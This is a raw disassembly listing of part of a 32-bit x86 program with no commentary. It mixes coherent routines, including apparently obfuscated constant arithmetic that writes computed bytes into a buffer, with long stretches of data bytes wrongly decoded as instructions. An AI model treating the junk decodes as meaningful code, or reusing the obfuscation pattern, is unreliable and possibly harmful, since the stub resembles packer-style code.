  416bdd:	mov    ds,WORD PTR [ecx+0x7efa7719]
  416be3:	rol    ah,cl
  416be5:	add    dh,BYTE PTR [ecx]
  416be7:	fisub  WORD PTR [ebx]
  416be9:	xor    bl,BYTE PTR [edi]
  416beb:	ficomp WORD PTR [edi+0x70]
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42824f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42837b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42822b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x4282a3,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x428303,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281eb
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42822f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0x69
  416d7e:	fstp   TBYTE PTR [edi]
  416d80:	mov    esi,0x1816f47a
  416d85:	loope  0x416d99
  416d87:	sbb    BYTE PTR [eax],bl
  416d89:	adc    BYTE PTR [edx-0x4c],0xf6
  416d8d:	jmp    0x416d5a
  416d8f:	dec    ebp
  416d90:	and    eax,0xbd1e2d79
  416d95:	dec    edx
  416d96:	xchg   ecx,eax
  416d97:	xchg   BYTE PTR [eax+edx*1],bl
  416d9a:	ficomp WORD PTR [ecx+0x1b]
  416d9d:	mov    eax,ds:0x936380c3
  416da2:	inc    eax
  416da3:	fdiv   QWORD PTR [ecx+0x37]
  416da6:	mov    edi,0x14541a4f
  416dab:	call   0xcecf2dee
  416db0:	xchg   esp,eax
  416db1:	mov    eax,0x86426fee
  416db6:	and    DWORD PTR [edi+esi*1],esp
  416db9:	mov    ds:0x2a4927f0,al
  416dbe:	call   0xab60:0x5ee3107a
  416dc5:	adc    ebp,ebp
  416dc7:	fsubr  QWORD PTR [ebp+0x1875f768]
  416dcd:	ss xchg ebp,eax
  416dcf:	out    0xe9,eax
  416dd1:	cs xor al,0x4f
  416dd4:	sbb    dl,cl
  416dd6:	jl     0x416d7c
  416dd8:	add    BYTE PTR [esp+ecx*2-0x1e0d1e23],dh
  416ddf:	cmc    
  416de0:	mov    dh,dl
  416de2:	or     ebp,DWORD PTR [edi+0x7d]
  416de5:	ret    
  416de6:	sbb    al,0x3b
  416de8:	neg    BYTE PTR [edi+eax*1+0x1b]
  416dec:	pop    eax
  416ded:	jne    0x416e1b
  416def:	dec    edi
  416df0:	xchg   ebx,eax
  416df1:	jne    0x416d92
  416df3:	cmp    BYTE PTR [esi+0x52],ah
  416df6:	or     al,0xec
  416df9:	std    
  416dfa:	mov    edx,0x4ed1ff06
  416dff:	test   al,0xfe
  416e01:	jne    0x416dbe
  416e03:	out    dx,eax
  416e04:	out    0x73,al
  416e06:	dec    edx
  416e07:	(bad)  
  416e08:	lods   al,BYTE PTR ds:[esi]
  416e09:	jae    0x416e4f
  416e0b:	std    
  416e0c:	ds jnp 0x416dc8
  416e0f:	inc    eax
  416e10:	push   ebp
  416e11:	push   ss
  416e12:	jg     0x416ddf
  416e14:	imul   edi,edi,0x2736b09b
  416e1a:	(bad)  
  416e1b:	js     0x416daa
  416e1d:	add    ecx,esp
  416e1f:	mov    eax,0x28857811
  416e24:	jp     0x416e5e
  416e26:	mov    eax,0x86c4e225
  416e2b:	ret    0xb3c3
  416e2e:	das    
  416e2f:	pop    eax
  416e30:	dec    edi
  416e31:	adc    eax,0x5e23e516
  416e36:	in     eax,0x93
  416e38:	or     al,0xb2
  416e3a:	data16 ja 0x416de1
  416e3d:	pop    esp
  416e3e:	aam    0x74
  416e40:	retf   
  416e41:	jmp    0xb26c:0x817ff585
  416e48:	sbb    eax,0xb3212530
  416e4d:	xchg   esi,eax
  416e4e:	xor    eax,0x142d9a01
  416e53:	sbb    dh,ch
  416e55:	add    ebp,DWORD PTR [ebx]
  416e57:	push   edx
  416e58:	dec    esp
  416e59:	dec    esi
  416e5a:	and    DWORD PTR [eax],esi
  416e5c:	in     al,0xc2
  416e5e:	js     0x416e86
  416e60:	test   DWORD PTR [esp+ecx*4-0x45],edi
  416e64:	pop    ds
  416e65:	mov    eax,ds:0x77bf65c9
  416e6a:	ret    
  416e6b:	dec    ebp
  416e6c:	pusha  
  416e6d:	jmp    0x1f6eee93
  416e72:	rcl    DWORD PTR [ecx],0x11
  416e75:	sbb    eax,0xb888f9ed
  416e7a:	dec    eax
  416e7b:	xor    BYTE PTR [ebx+0x63049529],cl
  416e81:	jl     0x416e72
  416e83:	mov    ch,0x85
  416e85:	inc    ebp
  416e86:	add    DWORD PTR [edx+0x49],0xa6cb3a0f
  416e8d:	sub    ah,bh
  416e8f:	aas    
  416e90:	sub    bl,cl
  416e92:	inc    ebx
  416e93:	inc    edi
  416e94:	aam    0x4a
  416e96:	xor    edi,DWORD PTR [eax+ebp*1+0x3a]
  416e9a:	daa    
  416e9b:	(bad)  
  416e9c:	popf   
  416e9d:	cwde   
  416e9e:	inc    ebx
  416e9f:	push   esi
  416ea0:	jns    0x416e58
  416ea2:	cmp    al,0x9
  416ea4:	je     0x416ee2
  416ea6:	ror    BYTE PTR [eax-0x55],cl
  416ea9:	xchg   esi,eax
  416eaa:	mov    DWORD PTR [edi],ebp
  416eac:	imul   esi,DWORD PTR [edx+0x2594651f],0xffffffb6
  416eb3:	bound  ebx,QWORD PTR [edi]
  416eb5:	jb     0x416f31
  416eb7:	lods   al,BYTE PTR ds:[esi]
  416eb8:	dec    edi
  416eb9:	mov    ah,0xd
  416ebb:	aaa    
  416ebc:	int3   
  416ebd:	lahf   
  416ebe:	pop    esp
  416ebf:	loop   0x416e47
  416ec1:	in     eax,0x75
  416ec3:	or     BYTE PTR [edi],cl
  416ec5:	mov    edi,0xdbe4580d
  416eca:	and    dh,BYTE PTR [eax+0x71f133e2]
  416ed0:	pop    esp
  416ed1:	xchg   ebp,eax
  416ed2:	xor    DWORD PTR [edi+0x2f],eax
  416ed5:	sbb    al,0xf4
  416ed7:	jecxz  0x416ee1
  416ed9:	mov    dl,0xe4
  416edb:	and    cl,BYTE PTR [esi*4-0x18fdc4d9]
  416ee2:	cwde   
  416ee3:	sbb    ch,BYTE PTR [edx]
  416ee5:	cmp    DWORD PTR [eax-0xb],0xb496b003
  416eec:	push   ds
  416eed:	lea    edx,[edi+0x78]
  416ef0:	(bad)  
  416ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ef2:	pop    edx
  416ef3:	out    0x48,al
  416ef5:	cld    
  416ef6:	jecxz  0x416efc
  416ef8:	cdq    
  416ef9:	mov    ecx,0xe8746d2a
  416efe:	dec    ebp
  416eff:	pop    edi
  416f00:	jae    0x416f7b
  416f02:	int    0x42
  416f04:	hlt    
  416f05:	xchg   DWORD PTR [ecx],edi
  416f07:	adc    BYTE PTR [eax],bh
  416f09:	test   al,0x4b
  416f0b:	xor    dl,BYTE PTR [edi-0x1f145c02]
  416f11:	inc    ebp
  416f12:	data16 (bad) 
  416f14:	in     eax,dx
  416f15:	inc    ecx
  416f16:	xchg   esi,eax
  416f17:	lahf   
  416f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f19:	dec    esp
  416f1a:	sub    ah,BYTE PTR [eax-0x1575234e]
  416f20:	jo     0x416ee6
  416f22:	add    al,0xba
  416f24:	adc    BYTE PTR [eax],cl
  416f26:	icebp  
  416f27:	inc    esp
  416f28:	push   eax
  416f29:	adc    ebx,esi
  416f2b:	and    al,0x55
  416f2d:	add    DWORD PTR [ebp-0x2e4964f2],edi
  416f33:	cmp    ch,BYTE PTR [edx+eax*8+0x36]
  416f37:	rcl    DWORD PTR [esi+ebp*4+0x68],0x80
  416f3c:	xor    dl,BYTE PTR [edi+esi*1-0x39c3daf9]
  416f43:	cmp    ebp,DWORD PTR [eax]
  416f45:	mov    ds:0xf5812b33,eax
  416f4a:	cmp    esp,DWORD PTR [esi]
  416f4c:	das    
  416f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f4e:	cmp    DWORD PTR [edi],eax
  416f50:	fistp  WORD PTR [edi]
  416f52:	sbb    BYTE PTR [edx-0x20a2de0],al
  416f58:	pop    esi
  416f59:	jbe    0x416fd0
  416f5b:	cmp    al,BYTE PTR [eax+0x5047bebc]
  416f61:	clc    
  416f62:	ds retf 0x6776
  416f66:	fisubr WORD PTR [eax+0x67]
  416f69:	ret    0x2e23
  416f6c:	aas    
  416f6d:	xor    cl,bh
  416f6f:	mov    eax,ds:0xaa302325
  416f74:	sub    DWORD PTR [edi],ebx
  416f76:	lahf   
  416f77:	scas   eax,DWORD PTR es:[edi]
  416f78:	pop    ecx
  416f79:	loope  0x416fd8
  416f7b:	rcr    BYTE PTR [ebx],0x56
  416f7e:	sbb    al,0xbd
  416f80:	mov    ebp,DWORD PTR [edx]
  416f82:	or     eax,0x2a7e50c7
  416f87:	mov    esi,DWORD PTR ds:0xbb0868c5
  416f8d:	je     0x416f26
  416f8f:	outs   dx,BYTE PTR ds:[esi]
  416f90:	sti    
  416f91:	inc    ebx
  416f92:	fsub   QWORD PTR [ebx-0x4a]
  416f95:	cmp    BYTE PTR [edx-0x49],0xa0
  416f99:	popf   
  416f9a:	(bad)  
  416f9b:	mov    esp,0x8b86b972
  416fa0:	popfw  
  416fa2:	nop
  416fa3:	add    DWORD PTR [ebx-0x5e423c5],esp
  416fa9:	add    eax,0x774e200c
  416fae:	(bad)  
  416faf:	and    edi,ebx
  416fb1:	aad    0x44
  416fb3:	and    al,0x66
  416fb5:	cmp    BYTE PTR [ebp+0x2c092241],al
  416fbb:	and    BYTE PTR [esi+esi*4+0x61],0xcd
  416fc0:	xor    dl,ch
  416fc2:	js     0x417009
  416fc4:	popf   
  416fc5:	add    DWORD PTR [esi+0x26],ebx
  416fc8:	mov    edx,0x83ef7e24
  416fcd:	je     0x416f92
  416fcf:	push   ebx
  416fd0:	ins    BYTE PTR es:[edi],dx
  416fd1:	push   esi
  416fd2:	xchg   BYTE PTR [edi],ah
  416fd4:	push   es
  416fd5:	mov    DWORD PTR [esp+edi*4],esi
  416fd8:	xchg   esi,eax
  416fd9:	jp     0x416fb4
  416fdb:	je     0x416f9b
  416fdd:	lods   al,BYTE PTR ds:[esi]
  416fde:	in     eax,dx
  416fdf:	call   0xe7f35872
  416fe4:	sub    ch,BYTE PTR [ebx]
  416fe6:	ins    BYTE PTR es:[edi],dx
  416fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fe8:	xor    al,BYTE PTR [eax+0x1e]
  416feb:	mov    edx,0xab077edb
  416ff0:	out    0xca,al
  416ff2:	pushf  
  416ff3:	fs pop ecx
  416ff5:	cmc    
  416ff6:	daa    
  416ff7:	pop    ebp
  416ff8:	in     eax,dx
  416ff9:	repnz fwait
  416ffb:	jmp    0x7d0d:0x8d7ae0f1
  417002:	mov    ch,0xca
  417004:	pop    ds
  417005:	push   0xffffff87
  417007:	sbb    bl,dh
  417009:	sar    DWORD PTR [ecx-0x56],cl
  41700c:	enter  0x7f26,0xe3
  417010:	aad    0x38
  417012:	dec    esp
  417013:	or     edx,DWORD PTR [esi+0x20]
  417016:	rcr    DWORD PTR [ebx],1
  417018:	popf   
  417019:	ds cmp eax,0x51d3758
  41701f:	int3   
  417020:	cli    
  417021:	stc    
  417022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417023:	fsub   st,st(1)
  417025:	mov    ecx,0xa301c7dd
  41702a:	push   edx
  41702b:	push   eax
  41702c:	jbe    0x416fd4
  41702e:	outs   dx,BYTE PTR ds:[esi]
  41702f:	xor    eax,DWORD PTR [ecx+0x3a33dcbe]
  417035:	shl    BYTE PTR [esi-0x2095904b],0x28
  41703c:	xor    BYTE PTR [edx],dl
  41703e:	adc    bl,bh
  417040:	adc    BYTE PTR [ecx+0x7d],0x28
  417044:	es sahf 
  417046:	pop    ebp
  417047:	sub    BYTE PTR [ecx],0xb6
  41704a:	aaa    
  41704b:	sbb    al,0x49
  41704d:	hlt    
  41704e:	inc    esi
  41704f:	mov    esi,0xbddbf5b7
  417054:	inc    ebx
  417055:	outs   dx,BYTE PTR es:[esi]
  417057:	clc    
  417058:	fistp  DWORD PTR [ecx+0x71ee20d2]
  41705e:	mov    edi,0x70de26a0
  417063:	or     eax,ecx
  417065:	test   eax,0x51ff7f5e
  41706a:	out    dx,eax
  41706b:	rcl    al,1
  41706d:	sub    bl,BYTE PTR [edi]
  41706f:	cld    
  417070:	inc    esp
  417071:	out    dx,eax
  417072:	ret    
  417073:	dec    eax
  417074:	cdq    
  417075:	pop    ebx
  417076:	loop   0x417053
  417078:	std    
  417079:	lea    esi,cs:[edi]
  41707c:	inc    ecx
  41707d:	cmc    
  41707e:	or     edx,esi
  417080:	mov    ebx,0xa9a87a56
  417085:	xchg   cl,bl
  417087:	jl     0x41707d
  417089:	jno    0x4170ee
  41708b:	adc    BYTE PTR [ecx-0x28],dh
  41708e:	and    BYTE PTR [edx-0x487aec8c],0x7f
  417095:	imul   esi,DWORD PTR [edx],0x903fb783
  41709b:	add    al,0xeb
  41709d:	or     al,0x73
  41709f:	ins    BYTE PTR es:[edi],dx
  4170a0:	jge    0x4170ee
  4170a2:	xchg   esi,eax
  4170a3:	retf   
  4170a4:	push   0x56
  4170a6:	jae    0x41705c
  4170a8:	inc    edx
  4170a9:	mov    eax,DWORD PTR [ebp-0x10]
  4170ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0xbeeb1595
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    al,dl
  41719f:	jmp    0xd89c:0x80bcf869
  4171a6:	and    al,0x17
  4171a8:	and    BYTE PTR [esi-0x79],ah
  4171ab:	mov    BYTE PTR [esi-0x69],ah
  4171ae:	jns    0x4171f9
  4171b0:	sub    al,0x83
  4171b2:	adc    eax,0x15a27d85
  4171b7:	xor    DWORD PTR [eax+ebx*4-0x5ef6d22e],esi
  4171be:	icebp  
  4171bf:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171c1:	mov    WORD PTR [bx+si],gs
  4171c4:	push   esi
  4171c5:	loop   0x417239
  4171c7:	mov    cl,0xea
  4171c9:	cmp    bl,bl
  4171cb:	adc    dh,BYTE PTR [edi-0x2af7ac9e]
  4171d1:	(bad)  
  4171d2:	adc    bh,bl
  4171d4:	inc    esi
  4171d5:	dec    edx
  4171d6:	inc    ebp
  4171d7:	pop    ebp
  4171d8:	fdivr  DWORD PTR [edi-0x36]
  4171db:	add    DWORD PTR [eax-0x25],edx
  4171de:	in     eax,dx
  4171df:	add    eax,0xacb0b017
  4171e4:	ds push 0x78
  4171e7:	mov    DWORD PTR [esp+ebp*8],ebp
  4171ea:	sub    BYTE PTR [ebx+0x5629a7f4],bh
  4171f0:	imul   esi,eax,0x43
  4171f3:	cmp    ch,BYTE PTR [ecx-0x3043552c]
  4171f9:	popa   
  4171fa:	xor    eax,DWORD PTR [ecx-0x62f4df9a]
  417200:	push   eax
  417201:	out    dx,al
  417202:	repnz repnz and eax,0x923b6428
  417209:	jg     0x417249
  41720b:	mov    DWORD PTR [ecx+eax*1+0x68],edx
  41720f:	push   esp
  417210:	mov    cl,0xa1
  417212:	sub    ah,BYTE PTR [ebx-0x77]
  417215:	ss (bad) 
  417217:	arpl   WORD PTR [ebp-0x25e62eaa],di
  41721d:	stos   DWORD PTR es:[edi],eax
  41721e:	rcl    DWORD PTR [edi-0x2d],0x87
  417222:	popa   
  417223:	xor    BYTE PTR [eax+0x6c0e1cee],0xf9
  41722a:	pusha  
  41722b:	fs dec esp
  41722d:	pmuludq mm2,QWORD PTR [esi-0x60]
  417231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417232:	mov    eax,ds:0x64ab4dc0
  417237:	icebp  
  417238:	outs   dx,DWORD PTR ds:[esi]
  417239:	push   ebp
  41723a:	lods   eax,DWORD PTR ds:[esi]
  41723b:	arpl   WORD PTR [esi+0x6b],ax
  41723e:	jno    0x4171c2
  417240:	pop    ebp
  417241:	repz retf 
  417243:	test   al,0x91
  417245:	mov    ecx,0xd9f1f9c
  41724a:	sar    DWORD PTR [ecx+0x64],0x20
  41724e:	ja     0x417250
  417250:	jne    0x41721b
  417252:	icebp  
  417253:	or     eax,0x889f34ca
  417258:	cmp    eax,esp
  41725a:	adc    dl,dl
  41725c:	mov    WORD PTR [esi+0x6fa0000],gs
  417262:	dec    edx
  417263:	and    cl,cl
  417265:	fwait
  417266:	pop    esp
  417267:	aaa    
  417268:	cmp    eax,edi
  41726a:	push   edx
  41726b:	xchg   ebp,eax
  41726c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41726d:	div    al
  41726f:	mov    ecx,0x76bdeada
  417274:	cmc    
  417275:	sub    BYTE PTR [esi+0x60007b63],dh
  41727b:	jl     0x417260
  41727d:	pusha  
  41727e:	fidivr WORD PTR [edi-0x5b]
  417281:	mov    cl,0x43
  417283:	pop    esp
  417284:	jg     0xfc9b42c4
  41728a:	retf   
  41728b:	loope  0x4172a9
  41728d:	sbb    BYTE PTR [ecx],bh
  41728f:	push   ebx
  417290:	test   BYTE PTR [ebx+0x2b11b3c9],bh
  417296:	call   0xfcc8b086
  41729b:	jns    0x4172a9
  41729d:	cld    
  41729e:	sbb    eax,0x53b6f48a
  4172a3:	test   DWORD PTR [ebx+0x3a],eax
  4172a6:	call   0x5513:0xd9a319e1
  4172ad:	push   cs
  4172ae:	arpl   si,dx
  4172b0:	retf   
  4172b1:	stos   DWORD PTR es:[edi],eax
  4172b2:	push   0xc
  4172b4:	mov    ecx,0xf8cbeeb7
  4172b9:	ret    
  4172ba:	ss fs push 0xffffff98
  4172be:	(bad)  
  4172bf:	push   0xfff4d5c7
  4172c4:	outs   dx,DWORD PTR ds:[esi]
  4172c5:	outs   dx,BYTE PTR ds:[esi]
  4172c6:	pop    eax
  4172c7:	mov    ebx,0xca9911ed
  4172cc:	xor    dh,cl
  4172ce:	jmp    0x1a09:0xe5d6199b
  4172d5:	clc    
  4172d6:	cmp    esp,0x7d6914cb
  4172dc:	sub    eax,0xb1a4a5db
  4172e1:	sbb    ebp,DWORD PTR [ebp-0x53]
  4172e4:	adc    DWORD PTR [esp+ebx*2],edi
  4172e7:	sub    ecx,DWORD PTR [edx-0x1]
  4172ea:	cmp    eax,0x41fae613
  4172ef:	jecxz  0x417299
  4172f1:	mov    edx,0xf737d71
  4172f6:	push   edi
  4172f7:	mov    bl,BYTE PTR [esi+edi*1-0x436dd85f]
  4172fe:	cmovns ebx,DWORD PTR [esi+0x7]
  417302:	xor    eax,0xe9ee0dd1
  417307:	add    al,0xa4
  417309:	test   BYTE PTR [eax+0x3],bl
  41730c:	rcr    ch,1
  41730e:	inc    esp
  41730f:	sbb    bl,dh
  417311:	fwait
  417312:	mov    edi,0x6b0d745a
  417317:	retf   0x87f4
  41731a:	xor    BYTE PTR [ebp-0x78fe95b5],bl
  417320:	xchg   DWORD PTR [eax-0x46],ebp
  417323:	jno    0x417354
  417325:	mov    eax,0xdda8530b
  41732a:	or     DWORD PTR [edx+0x7a9d477c],eax
  417330:	cmp    eax,0xc6d5b0e7
  417335:	sti    
  417336:	jmp    0x5eb48fa8
  41733b:	fisub  DWORD PTR [eax]
  41733d:	nop
  41733e:	inc    ecx
  41733f:	pop    ebx
  417341:	jmp    0xb699:0xb04ed345
  417348:	int3   
  417349:	bound  ebx,QWORD PTR [ecx-0x3cec216e]
  41734f:	mov    edx,0x8d64b119
  417354:	dec    esp
  417355:	mov    esi,0x8ed1854b
  41735a:	inc    esp
  41735b:	shr    BYTE PTR [eax+0x37],cl
  41735e:	pop    ds
  41735f:	sub    dl,BYTE PTR [edx-0x9e32922]
  417365:	fld    TBYTE PTR [ebp-0x50ea298a]
  41736b:	mov    cl,0x47
  41736d:	das    
  41736e:	xor    dh,BYTE PTR [ebx+0x66]
  417371:	sbb    eax,0x202445b
  417376:	add    eax,0xcbc572e8
  41737b:	inc    eax
  41737c:	fdivp  st(2),st
  41737e:	or     bl,BYTE PTR [ecx]
  417380:	int3   
  417381:	arpl   WORD PTR [eax-0x3f],sp
  417384:	mov    WORD PTR ds:0x3eb5b0f,?
  41738a:	scas   eax,DWORD PTR es:[edi]
  41738b:	jmp    0x6c26:0x9378de09
  417392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417393:	int    0xaa
  417395:	(bad)  
  417396:	cmp    eax,0xc87eb22
  41739b:	dec    edi
  41739c:	inc    edi
  41739d:	jne    0x417412
  41739f:	jmp    0xdfbd:0x45528321
  4173a6:	lods   al,BYTE PTR ds:[esi]
  4173a7:	and    DWORD PTR [edi],eax
  4173a9:	aad    0x7b
  4173ab:	(bad)  
  4173ac:	xor    dh,BYTE PTR [edx]
  4173ae:	add    dh,ch
  4173b0:	sub    eax,0xcb297ebe
  4173b5:	inc    esp
  4173b6:	int3   
  4173b7:	mov    edx,0x72bda091
  4173bc:	pop    ss
  4173bd:	mov    bl,0x12
  4173bf:	ret    0xa7df
  4173c2:	sbb    BYTE PTR [edi-0x49],bl
  4173c5:	jmp    0xc4bd:0x3239443
  4173cc:	sbb    DWORD PTR [ebp-0x25],ebx
  4173cf:	pushf  
  4173d0:	addr16 pop ds
  4173d2:	inc    ebx
  4173d3:	lahf   
  4173d4:	or     eax,0x5fa6d383
  4173d9:	mov    edx,0xe06bd594
  4173de:	pop    ecx
  4173df:	pop    edi
  4173e0:	pop    edi
  4173e1:	mov    ds,WORD PTR [eax]
  4173e3:	cmp    dl,BYTE PTR [ebx+ecx*1]
  4173e6:	jbe    0x41736d
  4173e8:	push   eax
  4173e9:	aam    0x6d
  4173eb:	push   ds
  4173ec:	mov    cl,0xd6
  4173ee:	loope  0x4173b4
  4173f0:	sar    DWORD PTR [edi+0x1b2e6ea3],1
  4173f6:	out    0x86,eax
  4173f8:	mov    ch,al
  4173fa:	repnz pop eax
  4173fc:	test   eax,0xa0449cfb
  417401:	mov    dl,0x48
  417403:	(bad)  
  417404:	xchg   edx,eax
  417405:	jp     0x417387
  417407:	cmp    eax,0x3b8d7414
  41740c:	jo     0x417459
  41740e:	dec    edx
  41740f:	adc    eax,DWORD PTR [edi-0x4a]
  417412:	rcl    BYTE PTR [edx-0x42],0x64
  417416:	mov    esp,0x386f0414
  41741b:	mov    bl,0x81
  41741d:	(bad)  
  41741e:	out    dx,eax
  41741f:	jno    0x417463
  417421:	fs dec ecx
  417423:	xor    DWORD PTR [eax+0x2a],0xffffffa3
  417427:	js     0x4173d0
  417429:	sbb    DWORD PTR [edi+0x14960f3],0x5cb81e2b
